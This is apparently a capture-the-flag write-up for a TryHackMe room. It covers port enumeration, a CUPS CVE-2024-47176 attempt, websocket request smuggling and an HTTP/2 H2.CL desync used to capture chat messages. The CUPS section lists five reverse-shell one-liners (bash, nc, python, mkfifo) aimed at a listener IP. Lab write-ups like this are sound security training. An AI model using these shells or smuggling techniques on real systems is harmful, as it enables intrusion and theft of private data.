# Summary
- link: https://tryhackme.com/room/elbandito
- skills required: http request smuggling on websocket and http/2 downgrade H2.CL
- Learning: avoid careless mistake, imoprtant of empties line in GET request

# Write-up to get the flag
### Enumeration
- port finding by nmap: found 22, 80, 631, 8080, followed by checking more details `nmap -sS -sV -O -sC -p22,80,631,8080 10.201.106.167`
  <img width="1231" height="593" alt="image" src="https://github.com/user-attachments/assets/979d48e1-c41f-4f30-bf02-0e4118a0643f" />
- points noted were:
  - port 80
  - port 631 open ipp title CUPS v.2.4.7 in the header W3C DTD HTML 4.01 Transitional.
  - port 8080 open http nginx, with spring jave framework
- Started ffufing immediately for anything interesting.
  <img width="1232" height="902" alt="Screenshot from 2025-10-04 13-12-33" src="https://github.com/user-attachments/assets/3697593c-7b7b-440c-a02f-d47218c443db" />
- started manual enumeration - also checking on all endpoints found from ffufing.
  <img width="1364" height="542" alt="image" src="https://github.com/user-attachments/assets/3bbdc777-0673-4154-bef3-3f945c5d156d" />
- Interesting points noted:
  - http://10.201.9.142:8080/services.html indicated possible exploitation on websocket
  - websocket is not open, and cannot burn amount in http://10.201.9.142:8080/burn.html
  - enumerated additional endpoints found during ffufing under port 8080 were checked.
  - a value '430.764' was found under http://10.201.9.142:8080/token
  - Upon checking, found exploitable CVE of CUPS v2.4.7
  - So it appears to be a clear path to exploit websocket, while the use of CUPS and token were unknown
### CUPS 2.4.7
- After doing some research online, I found CVE-2024-47176 :L more recent critical vulnerabilities have been discovered that affect versions of CUPS older than 2.4.8 and can be chained to allow remote code execution. These flaws allow attackers to execute commands remotely by injecting malicious instructions into print jobs.
- I git clone a vulnerability scanner `$ git clone https://github.com/MalwareTech/CVE-2024-47176-Scanner.git` and found it vulnerable.
  <img width="865" height="344" alt="image" src="https://github.com/user-attachments/assets/5b045acd-fc3f-4a5a-af3b-3b7c9d36a727" />
- It sounds promising so I git clone a script looking for a shortcut `git clone https://github.com/gumerzzzindo/CVE-2024-47176.git`
  <img width="1136" height="307" alt="image" src="https://github.com/user-attachments/assets/b8a500c0-415a-4d46-a925-4c6082649243" />
- Payloads I tried and didn't work were as per below. At the end I gave up and I already spent 1.5 hours up to this point.
  - `bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'`
  - `nc -e /bin/sh 10.11.139.184 4444`
  - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.139.184",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
  - `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.139.184",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.139.184 4444 >/tmp/f`
### Exploit websocket for the first flag.
- Checking burp on the details on request related to websocket, it was found that the websocket was secure.
- Then I was looking hard for a point of SSRF for injection.
- The thoughts was:
  - find a point to inject SSF to contact own server for status 101 Switching Protocols.
  - Setup own server using python to provide status 101 on all requests.
  - this will create a websocket tunnel to bypass proxy.
- finally this enbpoint was found `isOnline?url=${serviceUrl}`
  <img width="1359" height="672" alt="Screenshot from 2025-10-04 13-57-49" src="https://github.com/user-attachments/assets/5dbeb8c5-9d60-4c40-a63e-cb5e0ef342c7" />
- different formate of path transversal were conducted include php wrapper and didn't work.
- Quickly spin up a http.server as a POC. It worked.
  <img width="1269" height="446" alt="Screenshot from 2025-10-04 14-01-37" src="https://github.com/user-attachments/assets/4ae8288f-3e52-48d0-91b0-f3a66579d12b" />
- The script to provide status code 101 on all requests used was as per one of the room in THM given previously. I fired that up with port 4444
  <img width="1219" height="443" alt="image" src="https://github.com/user-attachments/assets/0e45d9fa-8832-4bae-994d-629442daa4f0" />
- Going back to Burp for the payload - and push one of those requests for websocket upgrade to repeater. Here was the payload... that didn't work. It waited forever.
  <img width="1316" height="426" alt="image" src="https://github.com/user-attachments/assets/d42ebfda-ce6e-49e1-9edc-68c5b6a7ae6c" />
- Ok. It must be the lack of 2 empty lines. Then this one worked.
  <img width="1340" height="710" alt="Screenshot from 2025-10-04 14-14-42" src="https://github.com/user-attachments/assets/2f3eb86c-0479-4c97-9b01-37fabf304f62" />
- Going back to enumeration and asked ChatGPT, we are dealing with frontend/Proxy: nginx (on port 8080), backend/Application: Spring Java Framework (running behind nginx). Then I also asked what are the common endpoint for Spring Jave Framework.
  <img width="1012" height="326" alt="image" src="https://github.com/user-attachments/assets/1ab6f8e8-0fc7-486b-b91d-20a69bfcc604" />
- Then the content-length was set to zero, and also stopped Burp to update content-length automatically. After some trial and error this was found. The endpoint was `GET /mappings HTTP/1.1` (with 2 empty lines for GET in mind)
  <img width="1621" height="915" alt="Screenshot from 2025-10-04 14-25-16" src="https://github.com/user-attachments/assets/1b21c464-f610-464d-9152-7f73c9253521" />
- Then another two end point were revealed `/admin-creds` and `/admin-flag`. One was for the first flag, and the other one was credential for login port 80.
- admin-creds:
  <img width="1076" height="505" alt="image" src="https://github.com/user-attachments/assets/22f76123-df8c-42ec-8b7b-70f1c95ca522" />
- admin-flag:
  <img width="1076" height="505" alt="image" src="https://github.com/user-attachments/assets/52d45fea-41ec-491f-af4a-7c194accb65b" />
### Exploit H2.CL for the second flag.
- https://10.201.9.142:80/ has "nothing to see". But upon inspecting messages.js (F12 Network), additional 2 endpoints were found `/send_message` and `/getMessages`.
  <img width="1712" height="926" alt="Screenshot from 2025-10-04 14-38-06" src="https://github.com/user-attachments/assets/be8d85a7-c0c1-4b09-adbd-1900904fd64d" />
- `https://10.201.9.142:80/getMessages` led to an login page to use the credentials obtained. The was the page a simple chat room.
  <img width="1407" height="533" alt="Screenshot from 2025-10-04 14-40-56" src="https://github.com/user-attachments/assets/3dd2142e-ab69-4601-bded-04b4bdc61637" />
- Upon checking in BURP, it was found /send_message was used to POST new messages, and /messages was used to GET old messages (refresh browser to trigger GET). GET is to get all messages sent.
- The thought process was, if I could exploit front-end (H2, it's https likely http2) and back-end desync issue, I could append and capture additional coversations. It would likely be the end-game. Then I push both POST and GET to repeater.
- Then I thought, I didn't know when other users (Oliver) would send any message, and I can only see Jack's sent message. So I need to have two POST requests in my payload, then someone else's message would be appended to my 2nd POST (smuggled) request.
- This was the payload. The "update content-length" was disabled. I kept the first POST request at content-lenght 6 so I could keep track on progress and trials. I also put date=2 in the 2nd POST and it shouldn't matter (?).
- 1st POST and 1st GET. I can see in the GET higlighted, some contents were appended to "2" so it appered to be working.
  <img width="1378" height="514" alt="image" src="https://github.com/user-attachments/assets/f8cd71f1-f68b-4205-9e66-2bdf64fe0093" />
  <img width="1386" height="777" alt="image" src="https://github.com/user-attachments/assets/d84e750b-f46a-426b-b261-4b9bb74e4286" />
- Then I changed the POST with the higlighted, and got the GET higlighted.
  <img width="1385" height="519" alt="image" src="https://github.com/user-attachments/assets/f551d6d8-1cc1-429c-afab-ba6687601292" />
  <img width="1387" height="769" alt="image" src="https://github.com/user-attachments/assets/50d40f31-7236-459f-800e-c8f9b6ced599" />
- Then I change the POST again and expected a flag - no flag. I found 5 and couldn't find 6.
  <img width="1387" height="514" alt="image" src="https://github.com/user-attachments/assets/8880e3a9-55ca-4d3e-b0e1-1a20ee33d9d4" />
  <img width="1378" height="821" alt="image" src="https://github.com/user-attachments/assets/bb8b2dea-609b-40b1-bc7e-d0cbfd1b2f9d" />
- I believed content length 800 was too long. So the next conversation couldn't be appended. I hope 700 would be fine. However, I couldn't get a flag with 700, then I tried different values and mugged around. I believe I clicked too quickly to GET before the next message fwas appended and therefore it didn't work. I would suggest to wait for 15 seconds after POST to click GET. At the end with content-length 700 I got the flag.
  <img width="1423" height="488" alt="Screenshot from 2025-10-04 15-14-39" src="https://github.com/user-attachments/assets/6e148b1e-5c99-4581-833d-afb893fc1498" />
  <img width="1432" height="781" alt="image" src="https://github.com/user-attachments/assets/bd3cf11f-5378-43aa-b0d1-bac6c6b1d1c7" />
- But the flag DID NOT WORK! Right before I posted it in Discord, I thought it must be encoded. by asking ChatGPT I found it was Unicode-encoded. Then this marked the end of this write-up.
  <img width="1600" height="334" alt="image" src="https://github.com/user-attachments/assets/05764fb6-4634-40bb-8cb9-c3dbc831c181" />










  
  

  



